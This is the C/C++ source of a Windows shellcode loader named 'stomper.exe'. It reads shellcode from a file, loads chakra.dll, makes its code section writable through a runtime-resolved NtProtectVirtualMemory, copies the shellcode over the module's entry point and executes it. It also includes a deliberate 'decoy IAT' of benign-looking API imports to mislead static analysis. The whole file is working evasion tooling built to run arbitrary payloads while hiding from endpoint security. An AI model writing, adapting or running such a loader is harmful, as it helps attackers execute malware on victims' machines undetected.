#include <windows.h>
#include <stdint.h>
#include <shlobj.h>
#include <winternl.h>

#pragma comment(lib, "user32")
#pragma comment(lib, "shell32")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "ole32")
#pragma comment(lib, "ntdll")

/* ── decoy IAT: benign-looking imports ───────────────────────── */

static volatile int _decoy_sink;

__attribute__((used, noinline))
static void _decoy_iat( void ) {
    SYSTEMTIME st;       GetSystemTime( &st );
    FILETIME   ft;       SystemTimeToFileTime( &st, &ft );
    WCHAR buf[MAX_PATH]; GetTempPathW( MAX_PATH, buf );
                         GetModuleFileNameW( NULL, buf, MAX_PATH );
                         GetComputerNameW( buf, (LPDWORD)&_decoy_sink );
                         GetUserNameW( buf, (LPDWORD)&_decoy_sink );
                         GetEnvironmentVariableW( L"PATH", buf, MAX_PATH );

    HKEY hk;
    RegOpenKeyExW( HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hk );
    RegCloseKey( hk );

    SHGetFolderPathW( NULL, CSIDL_APPDATA, NULL, 0, buf );
    CoInitializeEx( NULL, COINIT_APARTMENTTHREADED );
    CoUninitialize();

    _decoy_sink = GetSystemMetrics( SM_CXSCREEN );
    _decoy_sink = GetSystemMetrics( SM_CYSCREEN );
    SetLastError( 0 );
    GetTickCount();

    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx( &ms );
}

/* ── ntdll types ─────────────────────────────────────────────── */

typedef VOID ( *ScEntry )( _In_ void* );

typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG );

/* ── inline helpers (no CRT dependency) ──────────────────────── */

static inline void* _heap_alloc( SIZE_T sz ) {
    return HeapAlloc( GetProcessHeap(), 0, sz );
}

static inline void _heap_free( void* p ) {
    if ( p ) HeapFree( GetProcessHeap(), 0, p );
}

static inline void _memcpy( void* dst, const void* src, SIZE_T n ) {
    volatile uint8_t* d = (volatile uint8_t*)dst;
    const uint8_t*    s = (const uint8_t*)src;
    while ( n-- ) *d++ = *s++;
}

static inline int _strcmp( const char* a, const char* b ) {
    while ( *a && *a == *b ) { a++; b++; }
    return *(unsigned char*)a - *(unsigned char*)b;
}

#ifdef NOSTDLIB_BUILD
extern "C" void* memset( void* dst, int c, size_t n ) {
    volatile uint8_t* d = (volatile uint8_t*)dst;
    while ( n-- ) *d++ = (uint8_t)c;
    return dst;
}
extern "C" void* memcpy( void* dst, const void* src, size_t n ) {
    uint8_t* d = (uint8_t*)dst;
    const uint8_t* s = (const uint8_t*)src;
    while ( n-- ) *d++ = *s++;
    return dst;
}
#endif

static void _print( const char* msg ) {
    HANDLE h = GetStdHandle( STD_OUTPUT_HANDLE );
    DWORD n = 0;
    const char* p = msg;
    while ( *p ) p++;
    WriteConsoleA( h, msg, (DWORD)(p - msg), &n, NULL );
}

static void _print_hex( const char* prefix, uintptr_t val ) {
    char buf[64];
    const char* hex = "0123456789abcdef";
    int i = 0;
    const char* p = prefix;
    while ( *p && i < 40 ) buf[i++] = *p++;
    buf[i++] = '0'; buf[i++] = 'x';
    int started = 0;
    for ( int s = 60; s >= 0; s -= 4 ) {
        int nib = (int)((val >> s) & 0xF);
        if ( nib || started || s == 0 ) { buf[i++] = hex[nib]; started = 1; }
    }
    buf[i++] = '\n'; buf[i] = 0;
    _print( buf );
}

/* ── main ────────────────────────────────────────────────────── */

#ifdef NOSTDLIB_BUILD
extern "C" int mainCRTStartup( void )
#else
int main( int argc, char** argv )
#endif
{
    ScEntry               entry       = { nullptr };
    uint8_t*              file_buffer = { nullptr };
    uint32_t              file_length = { 0 };
    uintptr_t             image_base  = { 0 };
    PIMAGE_NT_HEADERS     nt_header   = { nullptr };
    PIMAGE_SECTION_HEADER sec_header  = { nullptr };
    ULONG                 protection  = { 0 };
    HMODULE               hNtdll      = { nullptr };
    fnNtProtectVirtualMemory pNtProtect = { nullptr };
    HANDLE                file_handle = { INVALID_HANDLE_VALUE };

#ifdef NOSTDLIB_BUILD
    int    argc = 0;
    char** argv = nullptr;
    LPWSTR cmdline = GetCommandLineW();
    int    wargc = 0;
    LPWSTR* wargv = CommandLineToArgvW( cmdline, &wargc );
    argc = wargc;

    char arg1_buf[MAX_PATH] = {0};
    if ( wargc >= 2 ) {
        WideCharToMultiByte( CP_ACP, 0, wargv[1], -1, arg1_buf, MAX_PATH, NULL, NULL );
    }
    LocalFree( wargv );
#endif

    if ( argc < 2 ) {
#ifndef NOSTDLIB_BUILD
        _print( "[*] usage: stomper.exe [shellcode.bin]\n" );
#endif
        return 1;
    }

    /* read shellcode file */
#ifdef NOSTDLIB_BUILD
    const char* sc_path = arg1_buf;
#else
    const char* sc_path = argv[1];
#endif

    file_handle = CreateFileA(
        sc_path, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
    if ( file_handle == INVALID_HANDLE_VALUE ) {
        _print( "[-] CreateFile failed\n" );
        goto LEAVE;
    }

    file_length = GetFileSize( file_handle, nullptr );
    if ( !file_length ) {
        _print( "[-] empty file\n" );
        goto LEAVE;
    }

    file_buffer = (uint8_t*)_heap_alloc( file_length );
    if ( !file_buffer ) {
        _print( "[-] alloc failed\n" );
        goto LEAVE;
    }

    if ( !ReadFile( file_handle, file_buffer, file_length, nullptr, nullptr ) ) {
        _print( "[-] ReadFile failed\n" );
        goto LEAVE;
    }
    CloseHandle( file_handle );
    file_handle = INVALID_HANDLE_VALUE;

    _print_hex( "[*] shellcode loaded, size=0x", file_length );

    /* resolve NtProtectVirtualMemory at runtime */
    hNtdll = GetModuleHandleA( "ntdll.dll" );
    pNtProtect = (fnNtProtectVirtualMemory)GetProcAddress( hNtdll, "NtProtectVirtualMemory" );
    if ( !pNtProtect ) {
        _print( "[-] resolve failed\n" );
        goto LEAVE;
    }

    /* module stomp: load chakra.dll */
    image_base = (uintptr_t)LoadLibraryExA( "chakra.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES );
    if ( !image_base ) {
        _print( "[-] LoadLibrary failed\n" );
        goto LEAVE;
    }

    _print_hex( "[*] chakra.dll @ ", image_base );

    nt_header  = (PIMAGE_NT_HEADERS)( image_base + ((PIMAGE_DOS_HEADER)image_base)->e_lfanew );
    sec_header = IMAGE_FIRST_SECTION( nt_header );

    for ( int i = 0; i < nt_header->FileHeader.NumberOfSections; i++ ) {
        if ( _strcmp( (char*)sec_header[i].Name, ".text" ) != 0 )
            break;
    }

    entry      = (ScEntry)( image_base + nt_header->OptionalHeader.AddressOfEntryPoint );
    image_base = image_base + sec_header->VirtualAddress;

    _print_hex( "[*] .text @ ", image_base );

    /* RW → write shellcode → restore */
    {
        PVOID  base = (PVOID)image_base;
        SIZE_T size = sec_header->SizeOfRawData;
        if ( pNtProtect( GetCurrentProcess(), &base, &size, PAGE_READWRITE, &protection ) != 0 ) {
            _print( "[-] protect(RW) failed\n" );
            goto LEAVE;
        }
    }

    _memcpy( (void*)entry, file_buffer, file_length );

    {
        PVOID  base = (PVOID)image_base;
        SIZE_T size = sec_header->SizeOfRawData;
        if ( pNtProtect( GetCurrentProcess(), &base, &size, protection, &protection ) != 0 ) {
            _print( "[-] protect(restore) failed\n" );
            goto LEAVE;
        }
    }

    _print( "[*] shellcode written\n" );

#ifndef AUTORUN
    _print( "[*] press enter..." );
    {
        HANDLE hIn = GetStdHandle( STD_INPUT_HANDLE );
        char c; DWORD rd;
        ReadConsoleA( hIn, &c, 1, &rd, NULL );
    }
#endif

    entry( nullptr );

LEAVE:
    if ( file_handle != INVALID_HANDLE_VALUE )
        CloseHandle( file_handle );
    _heap_free( file_buffer );

#ifdef NOSTDLIB_BUILD
    ExitProcess( 0 );
#endif
    return 0;
}
